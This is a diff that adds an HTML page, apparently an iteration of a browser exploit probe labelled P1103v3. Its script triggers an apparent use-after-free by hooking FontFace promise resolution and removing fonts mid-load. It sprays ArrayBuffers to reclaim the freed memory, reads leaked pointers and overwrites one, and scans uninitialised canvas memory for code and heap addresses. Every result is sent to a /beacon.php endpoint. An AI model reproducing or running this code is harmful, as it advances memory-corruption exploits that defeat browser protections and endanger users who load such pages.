@@ -1,0 +1,202 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1103v3</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.hit{color:#ff6;font-weight:bold}.ptr{color:#f6f;font-weight:bold}.fail{color:#f66}.ok{color:#6f6}.info{color:#6cf}.crit{color:#f00;font-weight:bold;font-size:13px}.win{color:#0f0;font-weight:bold;font-size:14px}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1103v3-BOOT','');
+
+// === EXACT P1100v2 trigger pattern ===
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var firedHere=false,map=null,uafBuf=null,uafPtrs=null,uafIdx=-1,patched=false;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(firedHere)return undefined;firedHere=true;
+  if(styleEl)styleEl.remove();try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll ALL 192-byte buffers (indices 32-39)
+for(var t=15;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map)return;
+  if(typeof BigUint64Array==='undefined')return;
+  for(var bi=32;bi<40;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;uafBuf=b;uafIdx=bi;
+      uafPtrs=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)uafPtrs.push({off:q*8,val:b[q]});
+      b[0]=0x100n;
+      B('P1103v3-PATCH','buf='+bi+'|ms='+ms+'|'+uafPtrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+// === ALL TESTS at 800ms ===
+setTimeout(function(){
+  if(!patched){
+    // Fallback: scan ALL sizes
+    if(map){for(var i=0;i<map.length;i++){
+      if(map[i].size!==192)continue;
+      var v=new Uint8Array(map[i].ab);var nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        uafBuf=new BigUint64Array(map[i].ab);uafIdx=i;patched=true;
+        uafBuf[0]=0x100n;uafPtrs=[];
+        for(var q=0;q<uafBuf.length;q++)if(uafBuf[q]!==0n)uafPtrs.push({off:q*8,val:uafBuf[q]});
+        B('P1103v3-LATE','buf='+i);break;
+      }
+    }}
+    if(!patched){B('P1103v3-NOHIT','');return;}
+  }
+  log('ok','UAF1 buf#'+uafIdx+' stable');
+  log('ptr',uafPtrs.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
+
+  // ====== PART A-D: Alternative triggers ======
+  var hits={a:false,b:false,c:false,d:false};
+
+  // A: FontFace.loaded
+  var fa=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fa)return undefined;fa=true;hits.a=true;B('P1103v3-A','fired');return undefined;
+  },set:function(){}});
+  try{var ffA=new FontFace('tA','local(Arial)');ffA.load();}catch(e){}
+
+  setTimeout(function(){
+    // B: FontFaceSet.ready
+    var fb=false;
+    try{
+      var fsp=Object.getPrototypeOf(document.fonts);
+      Object.defineProperty(fsp,'then',{configurable:true,get:function(){
+        if(fb)return undefined;fb=true;hits.b=true;B('P1103v3-B','fired');return undefined;
+      },set:function(){}});
+      void document.fonts.ready;
+    }catch(e){}
+
+    setTimeout(function(){
+      // C: ff.load() different font
+      var fc=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(fc)return undefined;fc=true;hits.c=true;B('P1103v3-C','fired');return undefined;
+      },set:function(){}});
+      try{var ffC=new FontFace('tC','local(Courier)');ffC.load();}catch(e){}
+
+      setTimeout(function(){
+        // D: fresh fonts.load
+        var fd=false;
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+          if(fd)return undefined;fd=true;hits.d=true;B('P1103v3-D','fired');return undefined;
+        },set:function(){}});
+        try{document.fonts.clear();}catch(e){}
+        var sd=document.createElement('style');
+        sd.textContent="@font-face{font-family:fD;src:local(Times);unicode-range:U+0045;}";
+        document.head.appendChild(sd);
+        var gD=new FontFace('gD','local(Helvetica)',{unicodeRange:'U+0045'});
+        document.fonts.add(gD);void gD.loaded;
+        try{document.fonts.load('1em gD, fD','EE').then(function(){},function(){});}catch(e){}
+
+        setTimeout(function(){
+          B('P1103v3-TRIGS','A='+hits.a+'|B='+hits.b+'|C='+hits.c+'|D='+hits.d);
+          log('phase','Triggers: A='+hits.a+' B='+hits.b+' C='+hits.c+' D='+hits.d);
+
+          // ====== PART E: Canvas uninit scan ======
+          log('phase','[E] Canvas uninit memory scan');
+          var cp1=[],hp1=[],cp2=[],hp2=[];
+          try{
+            var c1=document.createElement('canvas');c1.width=512;c1.height=2;
+            var x1=c1.getContext('2d');
+            x1.fillStyle='rgba(0,0,0,0)';x1.fillRect(0,0,1,1);
+            var d1=x1.getImageData(0,0,512,2).data;
+            var v1=new DataView(d1.buffer);
+            for(var i=0;i<d1.length-7;i+=4){
+              var lo=v1.getUint32(i,true),hi=v1.getUint32(i+4,true);
+              if(hi>=1&&hi<=7&&lo!==0&&lo!==0xafafafaf&&(lo&0xFF)!==0xaf)cp1.push({off:i,hi:hi,lo:lo});
+              if(hi>=8&&hi<=0x20&&lo!==0)hp1.push({off:i,hi:hi,lo:lo});
+            }
+            // After GC pressure
+            var gc=[];for(var i=0;i<3000;i++)gc.push(new ArrayBuffer(4096));gc=null;
+            var c2=document.createElement('canvas');c2.width=2048;c2.height=4;
+            var x2=c2.getContext('2d');
+            x2.fillStyle='rgba(0,0,0,0)';x2.fillRect(0,0,1,1);
+            var d2=x2.getImageData(0,0,2048,4).data;
+            var v2=new DataView(d2.buffer);
+            for(var i=0;i<d2.length-7;i+=4){
+              var lo=v2.getUint32(i,true),hi=v2.getUint32(i+4,true);
+              if(hi>=1&&hi<=7&&lo!==0&&lo!==0xafafafaf&&(lo&0xFF)!==0xaf)cp2.push({off:i,hi:hi,lo:lo});
+              if(hi>=8&&hi<=0x20&&lo!==0)hp2.push({off:i,hi:hi,lo:lo});
+            }
+            log('info','C1: code='+cp1.length+' heap='+hp1.length+' | C2: code='+cp2.length+' heap='+hp2.length);
+            var all=cp1.concat(cp2);
+            if(all.length>0){
+              log('crit','CODE PTRS: '+all.length);
+              var s=all.slice(0,8).map(function(p){return'0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');}).join(',');
+              log('ptr',s);B('P1103v3-CODE',s);
+            }else{B('P1103v3-CANVAS','c1c='+cp1.length+'|c2c='+cp2.length+'|c1h='+hp1.length+'|c2h='+hp2.length);}
+          }catch(e){B('P1103v3-CERR',e.message);}
+
+          // ====== PART F: API detection ======
+          log('phase','[F] API surface');
+          var wr=typeof WeakRef!=='undefined';
+          var fr=typeof FinalizationRegistry!=='undefined';
+          var px=typeof Proxy!=='undefined';
+          var ss=typeof Symbol!=='undefined'&&typeof Symbol.species!=='undefined';
+          var rr=typeof Reflect!=='undefined';
+          var abx=typeof ArrayBuffer.prototype.transfer!=='undefined';
+          var rab=typeof SharedArrayBuffer!=='undefined';
+          var wa=typeof WebAssembly!=='undefined';
+          var ri=typeof ResizeObserver!=='undefined';
+          var io=typeof IntersectionObserver!=='undefined';
+          var mo=typeof MutationObserver!=='undefined';
+          log('info','WR='+wr+' FR='+fr+' Px='+px+' Ss='+ss+' Rf='+rr);
+          log('info','ABx='+abx+' SAB='+rab+' Wa='+wa+' RO='+ri+' IO='+io+' MO='+mo);
+
+          // Species hijack test
+          var specHit=false;
+          if(ss){try{
+            Object.defineProperty(ArrayBuffer,Symbol.species,{configurable:true,get:function(){specHit=true;return ArrayBuffer;}});
+            new ArrayBuffer(16).slice(0,8);
+          }catch(e){}}
+
+          // FinalizationRegistry test
+          var frOk=false;
+          if(fr){try{
+            var reg=new FinalizationRegistry(function(){frOk=true;B('P1103v3-FRCLEAN','');});
+            var tgt={};reg.register(tgt,'x');tgt=null;
+            var gc2=[];for(var i=0;i<10000;i++)gc2.push(new ArrayBuffer(1000));gc2=null;
+          }catch(e){}}
+
+          setTimeout(function(){
+            var apis='wr='+wr+'|fr='+fr+'|px='+px+'|ss='+ss+'|rr='+rr+'|abx='+abx+'|sab='+rab+'|wa='+wa+'|ro='+ri+'|io='+io+'|mo='+mo+'|spec='+specHit+'|frC='+frOk;
+            B('P1103v3-APIS',apis);
+            log('info','Species='+specHit+' FRclean='+frOk);
+            log('','');
+            log('phase','=== P1103v3 DONE ===');
+            B('P1103v3-DONE','A='+hits.a+'|B='+hits.b+'|C='+hits.c+'|D='+hits.d+'|code='+(cp1.length+cp2.length)+'|wr='+wr+'|fr='+fr+'|spec='+specHit);
+          },800);
+        },500);
+      },400);
+    },400);
+  },400);
+},800);
+</script>
+</body></html>
